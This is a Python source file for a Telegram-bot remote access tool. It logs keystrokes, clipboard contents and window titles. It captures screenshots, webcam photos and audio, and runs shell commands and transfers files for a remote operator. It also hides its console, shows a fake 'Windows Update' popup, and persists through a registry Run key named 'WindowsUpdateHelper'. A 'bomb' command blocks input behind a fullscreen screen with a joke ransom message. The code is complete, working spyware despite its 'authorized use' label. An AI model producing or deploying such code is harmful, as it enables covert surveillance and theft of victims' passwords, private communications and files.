#!/usr/bin/env python3
"""
Remote PC Control via Telegram Bot - FULL FEATURED with ENHANCED BOMB
Features: Screenshot, Keylogger, Clipboard, Active window, Process list,
Shutdown/Restart, File search, Location, Webcam, Audio, Shell, File transfer,
Startup persistence, and BOMB (10 sec screen takeover with cyber-fun).
Author: 0xplt Aditya Bhosale
"""

import os
import sys
import subprocess
import tempfile
import platform
import threading
import time
import logging
from datetime import datetime

# Telegram
from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes, MessageHandler, filters

# Keylogger
from pynput import keyboard

# Screenshot & automation
import pyautogui

# System info & processes
import psutil

# Webcam
import cv2

# Audio
import sounddevice as sd
import scipy.io.wavfile

# Clipboard
import pyperclip

# Active window (Windows only)
if sys.platform == "win32":
    import win32gui

# For IP geolocation
import requests

# For Windows registry & popup & input blocking
if sys.platform == "win32":
    import winreg
    import ctypes

# For bomb feature
import tkinter as tk
from tkinter import font as tkfont

# ------------------------------------------------------------
# CONFIGURATION - REPLACE WITH YOUR OWN
# ------------------------------------------------------------
BOT_TOKEN = "<addYourBottoken>"          # Get from @BotFather
ALLOWED_USER_ID = <userid>             # Your Telegram user ID

# Setup logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO,
    filename='bot_debug.log'
)
logger = logging.getLogger(__name__)

# ------------------------------------------------------------
# GLOBALS
# ------------------------------------------------------------
keylog_file = os.path.join(os.getcwd(), "keylog.txt")
keylog_listener = None
keylog_active = False

# Background threads flags
clipboard_running = True
window_running = True
last_clipboard = ""
last_window = ""

# ------------------------------------------------------------
# KEYLOGGER (file based)
# ------------------------------------------------------------
def on_press(key):
    try:
        with open(keylog_file, 'a', encoding='utf-8') as f:
            if hasattr(key, 'char') and key.char is not None:
                f.write(key.char)
            else:
                if key == keyboard.Key.space:
                    f.write(' ')
                elif key == keyboard.Key.enter:
                    f.write('\n')
                elif key == keyboard.Key.backspace:
                    f.write('[BACKSPACE]')
                else:
                    special = str(key).replace('Key.', '[').replace('Key.', '') + ']'
                    f.write(f' {special} ')
    except Exception as e:
        logger.error(f"Keylogger write error: {e}")

def start_keylogger():
    global keylog_listener, keylog_active
    if not keylog_active:
        keylog_listener = keyboard.Listener(on_press=on_press)
        keylog_listener.start()
        keylog_active = True
        logger.info("Keylogger started")

def stop_keylogger():
    global keylog_listener, keylog_active
    if keylog_active and keylog_listener:
        keylog_listener.stop()
        keylog_active = False
        logger.info("Keylogger stopped")

def get_keylog_content():
    if not os.path.exists(keylog_file):
        return ""
    with open(keylog_file, 'r', encoding='utf-8', errors='ignore') as f:
        content = f.read()
    return content

def clear_keylog():
    if os.path.exists(keylog_file):
        os.remove(keylog_file)

# ------------------------------------------------------------
# CLIPBOARD MONITOR (background)
# ------------------------------------------------------------
def clipboard_monitor():
    global last_clipboard, clipboard_running
    while clipboard_running:
        try:
            current = pyperclip.paste()
            if current and current != last_clipboard:
                with open("clipboard_log.txt", "a", encoding="utf-8") as f:
                    f.write(f"{datetime.now()}: {current}\n{'='*50}\n")
                last_clipboard = current
        except Exception as e:
            logger.error(f"Clipboard error: {e}")
        time.sleep(2)

# ------------------------------------------------------------
# ACTIVE WINDOW TRACKER (Windows only)
# ------------------------------------------------------------
def window_tracker():
    global last_window, window_running
    if sys.platform != "win32":
        return
    while window_running:
        try:
            current = win32gui.GetWindowText(win32gui.GetForegroundWindow())
            if current and current != last_window:
                with open("window_log.txt", "a", encoding="utf-8") as f:
                    f.write(f"{datetime.now()} - {current}\n")
                last_window = current
        except Exception as e:
            logger.error(f"Window tracker error: {e}")
        time.sleep(3)

# ------------------------------------------------------------
# HELPER FUNCTIONS
# ------------------------------------------------------------
def take_screenshot():
    temp = tempfile.NamedTemporaryFile(delete=False, suffix=".png")
    pyautogui.screenshot().save(temp.name)
    return temp.name

def capture_webcam():
    cap = cv2.VideoCapture(0)
    if not cap.isOpened():
        return None
    ret, frame = cap.read()
    cap.release()
    if not ret:
        return None
    temp = tempfile.NamedTemporaryFile(delete=False, suffix=".jpg")
    cv2.imwrite(temp.name, frame)
    return temp.name

def record_audio(duration=5, samplerate=44100):
    try:
        recording = sd.rec(int(duration * samplerate), samplerate=samplerate, channels=1, dtype='int16')
        sd.wait()
        temp = tempfile.NamedTemporaryFile(delete=False, suffix=".wav")
        scipy.io.wavfile.write(temp.name, samplerate, recording)
        return temp.name
    except Exception as e:
        logger.error(f"Audio record error: {e}")
        return None

def get_system_info():
    info = [
        f"OS: {platform.system()} {platform.release()}",
        f"Computer: {platform.node()}",
        f"CPU: {platform.processor()} ({psutil.cpu_count(logical=True)} cores)",
        f"RAM: {psutil.virtual_memory().total // (1024**3)} GB total, {psutil.virtual_memory().percent}% used",
        f"Disk: {psutil.disk_usage('/').total // (1024**3)} GB total, {psutil.disk_usage('/').used // (1024**3)} GB used"
    ]
    try:
        import socket
        hostname = socket.gethostname()
        ip = socket.gethostbyname(hostname)
        info.append(f"Local IP: {ip}")
    except:
        info.append("Local IP: N/A")
    return "\n".join(info)

def get_location():
    """Get public IP and approximate location using ip-api.com"""
    try:
        resp = requests.get('http://ip-api.com/json/', timeout=10)
        data = resp.json()
        if data['status'] == 'success':
            return (f"IP: {data['query']}\n"
                    f"Country: {data['country']}\n"
                    f"Region: {data['regionName']}\n"
                    f"City: {data['city']}\n"
                    f"ISP: {data['isp']}\n"
                    f"Lat/Lon: {data['lat']}, {data['lon']}")
        else:
            return "Location lookup failed."
    except Exception as e:
        return f"Error getting location: {e}"

def run_shell_command(cmd):
    try:
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=30)
        output = result.stdout + result.stderr
        if not output.strip():
            output = "(no output)"
        return output[:4000]
    except subprocess.TimeoutExpired:
        return "Command timed out after 30 seconds."
    except Exception as e:
        return f"Error: {e}"

def add_to_startup():
    if sys.platform != "win32":
        return "Only Windows supported."
    if getattr(sys, 'frozen', False):
        exe_path = sys.executable
    else:
        exe_path = os.path.abspath(__file__)
    try:
        key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE) as key:
            winreg.SetValueEx(key, "WindowsUpdateHelper", 0, winreg.REG_SZ, exe_path)
        return "✅ Added to startup."
    except Exception as e:
        return f"❌ Failed: {e}"

def remove_from_startup():
    if sys.platform != "win32":
        return "Only Windows supported."
    try:
        key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE) as key:
            winreg.DeleteValue(key, "WindowsUpdateHelper")
        return "✅ Removed from startup."
    except Exception as e:
        return f"Failed: {e}"

def hide_console():
    if sys.platform == "win32":
        try:
            ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
        except:
            pass

def show_startup_popup():
    """Display a popup message when script starts (optional)"""
    if sys.platform == "win32":
        try:
            ctypes.windll.user32.MessageBoxW(0, "System update completed successfully.", "Windows Update", 0)
        except:
            pass

def search_files(pattern, root_dir="C:\\"):
    results = []
    try:
        for root, dirs, files in os.walk(root_dir):
            if any(skip in root for skip in ["$Recycle.Bin", "System Volume Information", "Windows\\System32\\config"]):
                continue
            for file in files:
                if pattern.lower() in file.lower():
                    results.append(os.path.join(root, file))
                    if len(results) >= 10:
                        break
            if len(results) >= 10:
                break
    except Exception as e:
        return [f"Search error: {e}"]
    return results

# ------------------------------------------------------------
# BOMB FEATURE - Enhanced: Cyber + Funny + 10 sec
# ------------------------------------------------------------
def block_input(block=True):
    if sys.platform == "win32":
        ctypes.windll.user32.BlockInput(block)

def create_cyber_window(message="0xplt Aditya Bhosale", duration=10):
    """
    Fullscreen cyberpunk + funny popup, blocks input, auto-closes after 'duration' seconds.
    """
    block_input(True)
    
    root = tk.Tk()
    root.attributes("-fullscreen", True)
    root.attributes("-topmost", True)
    root.configure(bg='black')
    root.overrideredirect(True)
    
    # Funny & cyber messages
    funny_lines = [
        "⚠️ SYSTEM LOCKDOWN ⚠️",
        "Pay me with your cute smile ? 😜",
        " Or Send 100 BTC to 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa",
        "(its fake ransom bro CHill!)",
        "",
        f"───===[ Created by {message} ]===───",
        "Press any key to continue... (just kidding, you can't 😈)"
    ]
    
    # Canvas for matrix rain effect
    canvas = tk.Canvas(root, bg='black', highlightthickness=0)
    canvas.pack(fill=tk.BOTH, expand=True)
    
    # Matrix rain characters
    matrix_chars = "01アイウエオカキクケコABCDEFGHIJKLMNOPQRSTUVWXYZ!@#$%^&*"
    drops = []
    for i in range(80):
        x = (i % 80) * 15
        y = - (i * 20) % root.winfo_screenheight()
        drops.append([x, y, matrix_chars[i % len(matrix_chars)]])
    
    def animate_matrix():
        canvas.delete("matrix")
        for drop in drops:
            drop[1] += 8
            if drop[1] > root.winfo_screenheight():
                drop[1] = -20
                drop[2] = matrix_chars[hash(str(drop[0]+drop[1])) % len(matrix_chars)]
            canvas.create_text(drop[0], drop[1], text=drop[2], fill='#0f0', font=('Courier', 12), tag="matrix")
        root.after(100, animate_matrix)
    
    root.after(500, animate_matrix)
    
    # Glitchy main text
    big_font = ("Courier New", 48, "bold")
    glitch_frame = tk.Frame(root, bg='black')
    glitch_frame.place(relx=0.5, rely=0.4, anchor='center')
    
    colors = ["#f0f", "#0ff", "#0f0"]  # magenta, cyan, green
    offsets = [(-5,0), (5,0), (0,0)]
    labels = []
    for i, (dx, dy) in enumerate(offsets):
        lbl = tk.Label(glitch_frame, text=message, font=big_font, fg=colors[i], bg='black')
        lbl.place(relx=0.5 + dx/root.winfo_screenwidth(), rely=0.5 + dy/root.winfo_screenheight(), anchor='center')
        labels.append(lbl)
    
    # Funny text frame
    sub_frame = tk.Frame(root, bg='black')
    sub_frame.place(relx=0.5, rely=0.65, anchor='center')
    for line in funny_lines:
        lbl = tk.Label(sub_frame, text=line, font=("Courier", 14), fg="#ff5555", bg='black')
        lbl.pack(pady=2)
    
    # Countdown timer
    time_left = duration
    timer_label = tk.Label(root, text=f"🔓 Unlocking in {time_left} seconds", font=("Courier", 20, "bold"), fg="yellow", bg='black')
    timer_label.place(relx=0.5, rely=0.9, anchor='center')
    
    def update_countdown():
        nonlocal time_left
        if time_left > 0:
            time_left -= 1
            timer_label.config(text=f"🔓 Unlocking in {time_left} seconds")
            root.after(1000, update_countdown)
        else:
            root.destroy()
    
    update_countdown()
    
    # Glitch animation thread
    def glitch_animate():
        import random
        for _ in range(25):  # glitch for ~2.5 seconds
            for lbl in labels:
                dx = random.randint(-15, 15)
                dy = random.randint(-10, 10)
                lbl.place(relx=0.5 + dx/root.winfo_screenwidth(), rely=0.5 + dy/root.winfo_screenheight(), anchor='center')
            root.update()
            time.sleep(0.1)
        # reset positions
        for i, (dx, dy) in enumerate(offsets):
            labels[i].place(relx=0.5, rely=0.5, anchor='center')
    
    threading.Thread(target=glitch_animate, daemon=True).start()
    
    # Ensure window is on top
    root.lift()
    root.focus_force()
    
    root.mainloop()
    block_input(False)

async def bomb(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Triggers a 10‑second screen takeover ."""
    if not await check_auth(update):
        return
    await update.message.reply_text("💣 **BOMB ACTIVATED!** Screen takeover for 10 seconds.\n*Prepare for cyber-fun...*", parse_mode='Markdown')
    
    def freeze_thread():
        create_cyber_window(message="0xplt Aditya Bhosale", duration=10)
    
    threading.Thread(target=freeze_thread, daemon=True).start()

# ------------------------------------------------------------
# TELEGRAM HANDLERS
# ------------------------------------------------------------
async def check_auth(update: Update) -> bool:
    if update.effective_user.id != ALLOWED_USER_ID:
        await update.message.reply_text("⛔ Unauthorized.")
        return False
    return True

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await check_auth(update):
        return
    await update.message.reply_text(
        "🤖 **Remote PC Control Active**\n"
        "*Created by 0xplt Aditya Bhosale*\n\n"
        "📌 **Commands:**\n"
        "/screenshot – Take screenshot\n"
        "/keylog_start – Start keylogger\n"
        "/keylog_stop – Stop keylogger\n"
        "/keylog_get – Get logs (clears after)\n"
        "/shell `<cmd>` – Run system command\n"
        "/upload `<filepath>` – Send file to Telegram\n"
        "/download – Send a document to save to PC\n"
        "/sysinfo – System information\n"
        "/mouse `<x>` `<y>` – Move mouse\n"
        "/click `<left/right/middle>` – Click\n"
        "/type `<text>` – Type text\n"
        "/webcam – Take photo\n"
        "/record – Record audio (5s)\n"
        "/clipboard – Get current clipboard\n"
        "/activewindow – Show active window\n"
        "/processes – List running processes\n"
        "/shutdown – Shutdown PC (10s delay)\n"
        "/restart – Restart PC (10s delay)\n"
        "/findfile `<pattern>` – Search files\n"
        "/location – IP & geolocation\n"
        "/startup – Add to Windows startup\n"
        "/remove_startup – Remove from startup\n"
        "/bomb – 10 sec screen freeze + cyber popup\n"
        "/about – About this bot\n"
        "/stop – Kill bot\n"
        "/help – This message",
        parse_mode='Markdown'
    )

async def about(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await check_auth(update): return
    await update.message.reply_text(
        "🔒 **Remote PC Monitor**\n"
        "Author: **0xplt Aditya Bhosale**\n"
        "Purpose: Personal laptop monitoring\n"
        "Version: 3.2 (Enhanced Bomb Edition)\n"
        "Features: Keylogger, Screenshot, Webcam, Audio, Clipboard, Active Window, Process list, Shell, File transfer, Startup persistence, Location, Shutdown/Restart, File search, Bomb (10 sec cyber takeover)\n"
        "⚠️ For authorized use only.",
        parse_mode='Markdown'
    )

async def screenshot(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await check_auth(update): return
    await update.message.reply_text("📸 Capturing...")
    try:
        path = take_screenshot()
        with open(path, 'rb') as f:
            await update.message.reply_photo(f)
        os.unlink(path)
    except Exception as e:
        await update.message.reply_text(f"Error: {e}")

async def keylog_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await check_auth(update): return
    start_keylogger()
    await update.message.reply_text("⌨️ Keylogger started. Logging to keylog.txt")

async def keylog_stop(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await check_auth(update): return
    stop_keylogger()
    await update.message.reply_text("⌨️ Keylogger stopped.")

async def keylog_get(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await check_auth(update): return
    logs = get_keylog_content()
    if not logs:
        await update.message.reply_text("No logs yet.")
    else:
        if len(logs) > 4000:
            logs = logs[:4000] + "..."
        await update.message.reply_text(f"📜 Logs:\n{logs}")
        clear_keylog()

async def shell(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await check_auth(update): return
    if not context.args:
        await update.message.reply_text("Usage: /shell dir")
        return
    cmd = " ".join(context.args)
    await update.message.reply_text(f"Executing: {cmd}")
    out = run_shell_command(cmd)
    await update.message.reply_text(f"Output:\n{out}")

async def upload(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await check_auth(update): return
    if not context.args:
        await update.message.reply_text("Usage: /upload C:\\file.txt")
        return
    path = " ".join(context.args)
    if not os.path.exists(path):
        await update.message.reply_text("File not found.")
        return
    try:
        with open(path, 'rb') as f:
            await update.message.reply_document(f, filename=os.path.basename(path))
    except Exception as e:
        await update.message.reply_text(f"Upload failed: {e}")

async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await check_auth(update): return
    doc = update.message.document
    if doc:
        file = await context.bot.get_file(doc.file_id)
        dest = os.path.join(os.getcwd(), doc.file_name)
        await file.download_to_drive(dest)
        await update.message.reply_text(f"✅ Saved to {dest}")

async def sysinfo(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await check_auth(update): return
    info = get_system_info()
    await update.message.reply_text(f"System Info:\n{info}")

async def mouse_move(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await check_auth(update): return
    if len(context.args) != 2:
        await update.message.reply_text("Usage: /mouse 500 300")
        return
    try:
        x, y = map(int, context.args[:2])
        pyautogui.moveTo(x, y)
        await update.message.reply_text(f"Moved to ({x},{y})")
    except Exception as e:
        await update.message.reply_text(f"Error: {e}")

async def click(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await check_auth(update): return
    button = context.args[0].lower() if context.args else "left"
    if button not in ['left','right','middle']:
        await update.message.reply_text("Use left/right/middle")
        return
    pyautogui.click(button=button)
    await update.message.reply_text(f"{button.capitalize()} clicked")

async def type_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await check_auth(update): return
    if not context.args:
        await update.message.reply_text("Usage: /type Hello")
        return
    text = " ".join(context.args)
    pyautogui.write(text)
    await update.message.reply_text(f"Typed: {text}")

async def webcam(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await check_auth(update): return
    await update.message.reply_text("📷 Capturing...")
    path = capture_webcam()
    if not path:
        await update.message.reply_text("Webcam failed.")
        return
    with open(path, 'rb') as f:
        await update.message.reply_photo(f)
    os.unlink(path)

async def record(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await check_auth(update): return
    await update.message.reply_text("🎙️ Recording 5 sec...")
    path = record_audio()
    if not path:
        await update.message.reply_text("Recording failed.")
        return
    with open(path, 'rb') as f:
        await update.message.reply_audio(f, filename="audio.wav")
    os.unlink(path)

async def clipboard_get(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await check_auth(update): return
    try:
        content = pyperclip.paste()
        if not content:
            content = "(empty)"
        await update.message.reply_text(f"📋 Clipboard:\n{content[:3000]}")
    except Exception as e:
        await update.message.reply_text(f"Error: {e}")

async def active_window(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await check_auth(update): return
    if sys.platform != "win32":
        await update.message.reply_text("Active window tracking only on Windows.")
        return
    try:
        window = win32gui.GetWindowText(win32gui.GetForegroundWindow())
        await update.message.reply_text(f"🪟 Active Window: {window}")
    except Exception as e:
        await update.message.reply_text(f"Error: {e}")

async def processes(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await check_auth(update): return
    procs = []
    for proc in psutil.process_iter(['pid', 'name', 'memory_info']):
        try:
            mem_mb = proc.info['memory_info'].rss // (1024 * 1024)
            procs.append(f"{proc.info['pid']}: {proc.info['name']} - {mem_mb} MB")
        except:
            continue
    output = "\n".join(procs[:50])
    await update.message.reply_text(f"📊 Processes (top 50):\n{output}")

async def shutdown(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await check_auth(update): return
    await update.message.reply_text("⚠️ Shutting down in 10 seconds... Send /stop to cancel.")
    time.sleep(10)
    if sys.platform == "win32":
        os.system("shutdown /s /t 0")
    else:
        os.system("shutdown -h now")

async def restart(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await check_auth(update): return
    await update.message.reply_text("⚠️ Restarting in 10 seconds... Send /stop to cancel.")
    time.sleep(10)
    if sys.platform == "win32":
        os.system("shutdown /r /t 0")
    else:
        os.system("reboot")

async def findfile(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await check_auth(update): return
    if not context.args:
        await update.message.reply_text("Usage: /findfile secret.docx or /findfile .txt")
        return
    pattern = " ".join(context.args)
    await update.message.reply_text(f"Searching for '{pattern}' (this may take a while)...")
    results = search_files(pattern)
    if not results:
        await update.message.reply_text("No files found.")
    else:
        msg = "\n".join(results)
        if len(msg) > 4000:
            msg = msg[:4000] + "..."
        await update.message.reply_text(f"Found files:\n{msg}")

async def location(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await check_auth(update): return
    await update.message.reply_text("📍 Fetching location...")
    loc = get_location()
    await update.message.reply_text(f"🌍 {loc}")

async def startup_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await check_auth(update): return
    msg = add_to_startup()
    await update.message.reply_text(msg)

async def remove_startup_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await check_auth(update): return
    msg = remove_from_startup()
    await update.message.reply_text(msg)

async def stop_bot(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await check_auth(update): return
    await update.message.reply_text("Stopping bot...")
    logger.info("Bot stopped by user")
    global clipboard_running, window_running
    clipboard_running = False
    window_running = False
    stop_keylogger()
    await context.application.stop()
    os._exit(0)

# ------------------------------------------------------------
# MAIN
# ------------------------------------------------------------
def main():
    hide_console()
    show_startup_popup()
    print("Remote PC Control Bot - Created by 0xplt Aditya Bhosale")
    logger.info("Bot started - Author: 0xplt Aditya Bhosale")

    # Start background monitoring threads
    threading.Thread(target=clipboard_monitor, daemon=True).start()
    if sys.platform == "win32":
        threading.Thread(target=window_tracker, daemon=True).start()

    # Build Telegram application
    app = Application.builder().token(BOT_TOKEN).build()

    # Command handlers (including /bomb)
    handlers = [
        CommandHandler("start", start),
        CommandHandler("help", start),
        CommandHandler("about", about),
        CommandHandler("screenshot", screenshot),
        CommandHandler("keylog_start", keylog_start),
        CommandHandler("keylog_stop", keylog_stop),
        CommandHandler("keylog_get", keylog_get),
        CommandHandler("shell", shell),
        CommandHandler("upload", upload),
        CommandHandler("sysinfo", sysinfo),
        CommandHandler("mouse", mouse_move),
        CommandHandler("click", click),
        CommandHandler("type", type_text),
        CommandHandler("webcam", webcam),
        CommandHandler("record", record),
        CommandHandler("clipboard", clipboard_get),
        CommandHandler("activewindow", active_window),
        CommandHandler("processes", processes),
        CommandHandler("shutdown", shutdown),
        CommandHandler("restart", restart),
        CommandHandler("findfile", findfile),
        CommandHandler("location", location),
        CommandHandler("startup", startup_cmd),
        CommandHandler("remove_startup", remove_startup_cmd),
        CommandHandler("bomb", bomb),          # <-- ENHANCED BOMB (10 sec)
        CommandHandler("stop", stop_bot),
        MessageHandler(filters.Document.ALL, handle_document),
    ]
    for h in handlers:
        app.add_handler(h)

    print("Bot is polling... Check bot_debug.log for errors.")
    app.run_polling()

if __name__ == "__main__":
    main()
